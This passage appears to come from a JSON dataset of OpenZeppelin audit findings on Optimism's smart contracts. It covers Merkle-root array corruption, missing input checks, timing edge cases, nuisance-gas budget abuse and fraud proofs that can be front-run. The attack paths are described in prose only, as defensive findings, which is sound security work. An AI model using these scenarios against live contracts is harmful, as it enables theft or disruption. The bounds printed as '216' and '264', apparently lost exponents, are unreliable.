      "content": "The [`getMerkleRoot` function](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L22) of the `Lib_MerkleTree` library accepts an array of elements and computes the corresponding Merkle root. In the process, it unexpectedly [overwrites up to half of the elements](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L88), thereby corrupting the original array. The current code base has [one instance](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/chain/OVM_StateCommitmentChain.sol#L340), within the `appendStateBatch` function of the `OVM_StateCommitmentChain` contract, where the array is used after it is passed to the `getMerkleRoot` function, but fortunately it only reads the length, which is unchanged. This function calculates the Merkle root of its [`_batch` parameter](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/chain/OVM_StateCommitmentChain.sol#L127), which means that the caller may attempt to reuse the (now corrupted) array.\n\n\nConsider including warning documentation on the `getMerkleRoot` and `appendStateBatch` functions stating that the input may be modified.\n\n\n***Update**: This issue was identified in the first audited commit. It was fixed in the latest audited commit by adding relevant documentation.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10733",
      "title": "[L03] Lack of input validations",
      "impact": "LOW",
      "content": "In the interest of predictability, some functions could benefit from more stringent input validations.\n\n\n* The [`init` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L59) of the `Abs_L2DepositedToken` abstract contract does not ensure that [the passed token gateway address](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L60) is non-zero. If it is called with a zero address (before the gateway address in state is set to a non-zero value), it will incorrectly [emit](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L68) an `Initialized` event.\n* The [`getMerkleRoot` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L23) of the `Lib_MerkleTree` library provides 16 [default values](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L41-L58), which implicitly limits the depth of unbalanced trees to 16. Balanced trees, on the other hand, have no restriction. Although this is unlikely to matter in practice, usage assumptions should be documented and validated wherever possible. Consider explicitly bounding the number of elements by 216.\n* According to the RLP specification described in the [Appendix B of Ethereum’s Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf#appendix.B), *“Byte arrays containing 264 or more bytes cannot be encoded”*. This restriction is not being explicitly enforced by the [`writeBytes` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/rlp/Lib_RLPWriter.sol#L23) of the `Lib_RLPWriter` library.\n* The [`_editBranchIndex` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L864) of the `Lib_MerkleTrie` library should explicitly validate that [the passed index](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L866) is lower than the [`TREE_RADIX` constant](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L34-L35) to avoid misusage.\n* The [`_getNodePath` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L603) of the `Lib_MerkleTrie` library should explicitly validate that [the passed node](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L604) is a leaf or extension node to avoid misuse.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10732",
      "title": "[L02] Inaccessible code when retrieving Merkle roots",
      "impact": "LOW",
      "content": "There is an inaccessible [`if` block](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L36-L38) in the `getMerkleRoot` function of the `Lib_MerkleTree` library. This is due to the fact that the [`require`statement above it](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L31-L34) reverts in the case that the caller-provided `_elements` array has no elements.\n\n\nBecause inside the `if` block the function [is returning](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L37) the first element of the array, we assume that the original intended behavior was to validate that the `_elements` array has a single element. Consider modifying the condition evaluated to reflect this.\n\n\n***Update**: This issue was identified in the first audited commit. It is fixed in the latest audited commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10731",
      "title": "[L01] Appending transactions to the Canonical Transaction Chain in specific blocks might unexpectedly fail",
      "impact": "LOW",
      "content": "Enqueued transactions cannot be included by non-Sequencer accounts during the force inclusion period. If a user attempts to do so calling the [`appendQueueBatch` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L337) of the `OVM_CanonicalTransactionChain` contract, then the call would revert at [this `require` statement](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L359-L362). Once the force inclusion period finishes for the next enqueued transaction to be appended, then the Sequencer just cannot ignore it, and therefore the queue transaction *must* be included. This behavior is enforced by [this `require` statement](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L992-L995) executed during a call to the [`appendSequencerBatch` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L393).\n\n\nHowever, the `require` statements referenced above enforce strict inequalities, failing to consider the case where the current block’s timestamp is equal to the sum of the next queue element’s timestamp and the force inclusion period. In this scenario, the Sequencer would be prevented from adding transactions (since it should first append the transaction at the queue’s front), but it would also be impossible to add the enqueued transaction via the `appendQueueBatch` function. As a result, attempts to append transactions to the Canonical Transaction Chain in this scenario would unexpectedly fail. It should be noted that the issue would be automatically resolved by waiting for the next block.\n\n\nConsider modifying one of the two strict inequalities referenced above to ensure enqueued transactions can *always* be appended to the Canonical Transaction Chain, either by the Sequencer or via the `appendQueueBatch` function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10730",
      "title": "[M05] Nuisance gas left is not reduced to zero when operation exceeds budget",
      "impact": "MEDIUM",
      "content": "The [`_useNuisanceGas` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1589) of the `OVM_ExecutionManager` contract is intended to [reduce a certain amount of nuisance gas](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1600) during transaction execution. When the amount of nuisance gas required by the operation [exceeds the nuisance gas left](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1596), the function [reverts](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1597) the call with flag `EXCEEDS_NUISANCE_GAS`. However, this flag is not taken into account when accounting for the call’s nuisance gas consumption [within the `_handleExternalMessage` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1038-L1043). Therefore, the nuisance gas left for the transaction is never reduced to zero, allowing subsequent operations to continue consuming nuisance gas.\n\n\nFor correctness, consider reducing to zero the amount of nuisance gas left whenever a call raises the `EXCEEDS_NUISANCE_GAS` flag.\n\n\n***Update**: Fixed in [pull request #1366](https://github.com/ethereum-optimism/optimism/pull/1366/commits/a2346c291797813f99b32e1d92f26c33a6d55d2d). Transactions revert pre-emptively so they will not exceed their nuisance gas limit, but the nuisance gas budget is still consumed.*",
      "summary": "\nThis bug report is about the `_useNuisanceGas` function of the `OVM_ExecutionManager` contract. This function is intended to reduce a certain amount of nuisance gas during transaction execution. When the amount of nuisance gas required by the operation exceeds the nuisance gas left, the function reverts the call with flag `EXCEEDS_NUISANCE_GAS`. However, this flag is not taken into account when accounting for the call’s nuisance gas consumption within the `_handleExternalMessage` function. This means the nuisance gas left for the transaction is never reduced to zero, allowing subsequent operations to continue consuming nuisance gas.\n\nTo fix this bug, the amount of nuisance gas left should be reduced to zero whenever a call raises the `EXCEEDS_NUISANCE_GAS` flag. This has been fixed in pull request #1366, where transactions revert pre-emptively so they will not exceed their nuisance gas limit, but the nuisance gas budget is still consumed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10729",
      "title": "[M04] Sequencer entrypoint contracts ignore success flags and returned data",
      "impact": "MEDIUM",
      "content": "The `fallback` functions of the [`OVM_ProxySequencerEntrypoint`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_ProxySequencerEntrypoint.sol) and [`OVM_SequencerEntrypoint`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_SequencerEntrypoint.sol) contracts respectively execute [`ovmDELEGATECALL`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_ProxySequencerEntrypoint.sol#L25) and [`ovmCALL`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_SequencerEntrypoint.sol#L62) calls, yet they fail to handle the success flag returned by these calls, as well as any data returned. As a consequence, calls to these `fallback` functions could fail silently, and might be erroneously seen as successful by callers.\n\n\nTo avoid unexpected errors, consider handling success flags and return data for these calls. It should be noted that fallback function return values were [introduced in solidity 0.7.6](https://github.com/ethereum/solidity/releases/tag/v0.7.6), so they will not be supported by [the full range of target compilers](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_ProxySequencerEntrypoint.sol#L2).\n\n\n***Update**: Fixed for the `OVM_SequencerEntrypoint` case in [pull request #603](https://github.com/ethereum-optimism/optimism/pull/603/commits/293a386efb8aa574eb53767a3f09cda928a09095). The `OVM_ProxySequencerEntrypoint` contract was removed in [pull request #549](https://github.com/ethereum-optimism/optimism/pull/549/commits/a4132c7c0a70c773da084fea5ed2a68b88e0cc27).*",
      "summary": "\nThis bug report is about two contracts, the OVM_ProxySequencerEntrypoint and the OVM_SequencerEntrypoint. These contracts have a `fallback` function that execute ovmDELEGATECALL and ovmCALL calls, but they fail to handle the success flag returned by these calls, as well as any data returned. This could result in silent failures and incorrect success messages. To avoid this, consider handling success flags and return data for these calls. It should be noted that fallback function return values were introduced in solidity 0.7.6, so they will not be supported by the full range of target compilers. This issue has been fixed for the OVM_SequencerEntrypoint case and the OVM_ProxySequencerEntrypoint contract was removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10728",
      "title": "[M03] Initial state root cannot be challenged",
      "impact": "MEDIUM",
      "content": "The [`initializeFraudVerification` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L92) of the `OVM_FraudVerifier` contract intends to ensure that the provided [pre-state root](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L94-L95) and [transaction](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L98-L99) correspond to each other. In other words, that the referenced transaction was executed against the provided pre-state. This is implemented in [this `require` statement](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L133-L136), where the offset suggests that the element at index N in the State Commitment Chain is the post-state root of the transaction at index N in the Canonical Transaction Chain. This is consistent with the fact that the size of the State Commitment Chain is [bounded by the total number of transactions in the Canonical Transaction Chain](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_StateCommitmentChain.sol#L151-L154).\n\n\nHowever, since fraud proofs [require the pre-state](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L94) to exist in the State Commitment Chain, it is impossible to prove fraud against the first state root in the State Commitment Chain. As a result, the first transaction in the Canonical Transaction Chain can be considered meaningless, and the first state root in the State Commitment Chain will remain unchallenged. This effectively introduces a remarkable trust assumption, where the entity that provides the first state root can decide on the OVM’s genesis state.\n\n\nMoreover, since state roots are [deleted in batches](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L282) instead of individually, if the genesis state root shares the same batch with other state roots, and one of them is successfully proven fraudulent, the entire batch of state roots (including the genesis state root) will be removed, and therefore the next state root to be appended to the State Commitment Chain will become the new “genesis” state.\n\n\nConsider thoroughly documenting the deployment procedure, including the fact that the first transaction is unused, and how the Optimism team intends to ensure the first state root will be the intended genesis state. Alternatively, consider introducing a mechanism to challenge the first post-state root against a known genesis state.\n\n\n***Update**: Acknowledged, but won’t fix. Optimism’s statement for this issue:*\n\n\n\n> \n> The initial state root is analogous to Ethereum’s genesis block. It cannot be the result of a fraudulent transaction, users of an Optimistic Ethereum deployment must accept the initial state root in the same way that they accept the state transition rules for any blockchain.\n> \n> \n>",
      "summary": "\nThe OVM_FraudVerifier contract contains an `initializeFraudVerification` function which is intended to ensure that the provided pre-state root and transaction correspond to each other. This is done by requiring the element at index N in the State Commitment Chain to be the post-state root of the transaction at index N in the Canonical Transaction Chain. \n\nHowever, since fraud proofs require the pre-state to exist in the State Commitment Chain, it is impossible to prove fraud against the first state root in the State Commitment Chain. This effectively introduces a trust assumption, where the entity that provides the first state root can decide on the OVM’s genesis state. Furthermore, since state roots are deleted in batches, if the genesis state root shares the same batch with other state roots, and one of them is successfully proven fraudulent, the entire batch of state roots (including the genesis state root) will be removed. \n\nThe Optimism team has acknowledged this issue, but has no plans to fix it. They consider the initial state root to be analogous to Ethereum’s genesis block, and users must accept it in the same way that they accept the state transition rules for any blockchain.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10727",
      "title": "[M02] Pre-state root and transaction may not uniquely identify transitions",
      "impact": "MEDIUM",
      "content": "The `OVM_FraudVerifier` contract [identifies State Transitioner contracts](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L63) using the pre-state root and the transaction hash. The same function is [used by the `OVM_BondManager` contract](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_BondManager.sol#L80). Note that fraud proofs are intended to remove the post-state root (and subsequent state roots) but they are specified by the combination of pre-state root and transaction hash. However, given the possibility of repeated transactions and state roots, this approach may not uniquely identify a particular transition.\n\n\nThis means that a fraud proof can apply equally to all transitions that use the same pre-state root and transaction hash. However, [only one pre-state root can be specified](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L160-L161) during finalization of the proof. As a result, legitimate fraud proofs that attempt to remove the first invalid state root can be maliciously finalized on a later state root, forcing the original fraud proof to be restarted. This can be achieved by tracking the progress of active fraud proofs or by front-running calls to the `finalizeFraudVerification` function, and could prevent the first invalid state root from being removed indefinitely.\n\n\nIt should be noted that this attack is possible because [State Transitioner contracts are removed](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L211) once they are finalized. The code base includes a comment suggesting that they may be retained in future versions, which would allow the same State Transitioner to be reused for every matching transition. Yet it is worth noting that this may require a redesign of how this function [interacts with the Bond Manager](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L169). An alternative approach can be based on identifying State Transitioner contracts with the [unused `stateTransitionIndex` variable](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L67) as well to avoid collisions. Interestingly, since it is possible for a state root to be removed from the State Commitment Chain and then be reintroduced at the same location (possibly with a different history and batch structure), this would not necessarily uniquely identify a transition, but in such a case, reusing the State Transitioner contract would be appropriate.\n\n\n***Update:** Acknowledged. This is not exploitable while the Sequencer is assumed to be trusted and the public transaction queue mechanism is disabled. The Optimism team intends to address this in the future.*",
      "summary": "\nThis bug report concerns the `OVM_FraudVerifier` and `OVM_BondManager` contracts, which are part of the Optimistic Ethereum protocol. These contracts are used to identify State Transitioner contracts using the pre-state root and transaction hash. The problem is that fraud proofs are specified by the combination of pre-state root and transaction hash, which means that a fraud proof can apply equally to all transitions that use the same pre-state root and transaction hash. This means that a malicious actor could finalize a legitimate fraud proof on a later state root, preventing the first invalid state root from being removed indefinitely.\n\nThe Optimism team has acknowledged the issue and plans to address it in the future. As a potential solution, they suggest identifying State Transitioner contracts with the unused `stateTransitionIndex` variable, which would avoid collisions. Additionally, they could consider reusing the State Transitioner contract if a state root is reintroduced with a different history and batch structure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10726",
      "title": "[M01] Potential mismatch in allowed gas limit for sequenced and queued transactions",
      "impact": "MEDIUM",
      "content": "Both enqueued and sequenced transactions are expected to be limited in the amount of gas they can consume. For enqueued transactions the [`enqueue` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L256) of the `OVM_CanonicalTransactionChain` contract [ensures](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L269-L272) that their `gasLimit` does not exceed the `maxTransactionGasLimit` (a parameter of the Canonical Transaction Chain [set during construction](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L75) by the contract’s deployer). Conversely, for sequenced transactions the expected `gasLimit` is only validated during verification of a sequenced transaction and actually [retrieved](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L1122) from the Execution Manager. Since there is no logic programmatically enforcing that the gas limit retrieved from the Execution Manager matches the gas limit enforced by the Canonical Transaction Chain, there is room for the `gasLimit` of sequenced and enqueued transactions to be capped differently.\n\n\nWhile the described behavior would introduce an unexpected difference between in how enqueued and sequenced transactions are treated in the OVM, it would only occur due to a misconfiguration of the system by its deployers or a corrupt upgrade.\n\n\nConsider defining a single source of truth that dictates the gas limit for both sequenced and enqueued transactions. Alternatively, consider introducing off-chain validations to ensure these values always match, reverting new configurations or upgrades otherwise.\n\n\n***Update:** Acknowledged. The Optimism team intends to address this in the future.*",
      "summary": "\nThe bug report discusses a potential issue with the Optimistic Virtual Machine (OVM) where the gas limit of enqueued and sequenced transactions could be capped differently. The gas limit for enqueued transactions is enforced by the OVM_CanonicalTransactionChain contract, while the gas limit for sequenced transactions is retrieved from the Execution Manager. This could lead to unexpected differences in how enqueued and sequenced transactions are treated, though this would only occur due to a misconfiguration of the system by its deployers or a corrupt upgrade.\n\nThe report suggests defining a single source of truth that dictates the gas limit for both sequenced and enqueued transactions, or introducing off-chain validations to ensure these values always match, reverting new configurations or upgrades otherwise. The Optimism team has acknowledged the report and intends to address this issue in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10725",
      "title": "[H05] Repeatedly exceeding nuisance gas limit",
      "impact": "HIGH",
      "content": "Transactions are provided a [nuisance gas budget](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1836) to limit the amount of overhead that could be required in the pre-execution and post-execution phase of a fraud proof. However, this does not prevent transactions from breaching the limit, it merely [detects when they do so](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1596-L1598). In effect, they are able to exceed their budget by one operation.\n\n\nMoreover, the nuisance gas provided to each call frame is [limited to the gas provided for that call](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L963-L964), which also [limits how much of the transaction’s nuisance gas it can consume](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1047). Therefore, each individual call frame can exceed its budget by one operation, but the transaction will only be charged for the specified budget. Consequently, if a transaction consisted entirely of call frames with minimal gas that maximally exceed their nuisance gas budget, the whole transaction could create significantly more overhead than its budget would suggest. The only limit to this attack is the number of cheap call frames that can fit in a transaction.\n\n\nThe operation that creates the most overhead is [interacting with a large contract](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1332-L1334), since this may require deploying that contract to the EVM during a fraud proof. The Optimism team have indicated they intend to introduce a minimum nuisance gas budget in each call frame that covers the cost of deploying the largest possible EVM contract. While this would mitigate the vulnerability, it should be noted that the call frame could still consume this nuisance gas on other operations before interacting with a large contract, so it would still be possible to consume twice as much nuisance gas as the transaction budget would suggest. Consider documenting this behavior in the function comments.\n\n\n***Update**: Fixed in [pull request #1366](https://github.com/ethereum-optimism/optimism/pull/1366/commits/a2346c291797813f99b32e1d92f26c33a6d55d2d). Transactions that could breach their nuisance gas limit are now reverted pre-emptively.*",
      "summary": "\nThis bug report is about transactions exceeding their nuisance gas budget on the Ethereum Optimism blockchain. Transactions are provided a nuisance gas budget to limit the amount of overhead that could be required in the pre-execution and post-execution phase of a fraud proof. However, this does not prevent transactions from breaching the limit, it merely detects when they do so. Moreover, the nuisance gas provided to each call frame is limited to the gas provided for that call, which also limits how much of the transaction’s nuisance gas it can consume. This means that each individual call frame can exceed its budget by one operation, but the transaction will only be charged for the specified budget. \n\nThe operation that creates the most overhead is interacting with a large contract, since this may require deploying that contract to the EVM during a fraud proof. The Optimism team have indicated they intend to introduce a minimum nuisance gas budget in each call frame that covers the cost of deploying the largest possible EVM contract. While this would mitigate the vulnerability, it should be noted that the call frame could still consume this nuisance gas on other operations before interacting with a large contract, so it would still be possible to consume twice as much nuisance gas as the transaction budget would suggest. The bug has since been fixed in pull request #1366, where transactions that could breach their nuisance gas limit are now reverted pre-emptively.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10724",
      "title": "[H04] Irrelevant proof contributions are accepted",
      "impact": "HIGH",
      "content": "The [`contributesToFraudProof` modifier](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/Abs_FraudContributor.sol#L12) declared in the `Abs_FraudContributor` contract is used to [reward users for participating in proving fraud](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/Abs_FraudContributor.sol#L11).\n\n\nThere are several functions marked with this modifier to assign rewards to users, regardless of whether they are making meaningful proof contributions. Some examples of irrelevant contributions that would grant rewards include:\n\n\n* contributing [irrelevant contract state](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L193) before a fraud proof.\n* contributing [irrelevant storage slots](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L265) before a fraud proof.\n* attempting to [initialize a fraud proof](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L103) that has already been initialized. This is possible because if the fraud proof has been initialized, executing the `initializeFraudVerification` function of the `OVM_FraudVerifier` contract [will still finish execution rather than reverting](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L107-L109).\n\n\nIt should be noted that the [`OVM_BondManager` contract](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_BondManager.sol) is out this audit’s scope. Nevertheless, consider changing the [`contributesToFraudProof` modifier](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/Abs_FraudContributor.sol#L12) or the logic within the `OVM_BondManager` contract to prevent abuse of rewards during fraud proofs.\n\n\n***Update:** Acknowledged. The Optimism team decided not to prioritize this issue because it does not apply to the current release, since the bond manager is disabled.*",
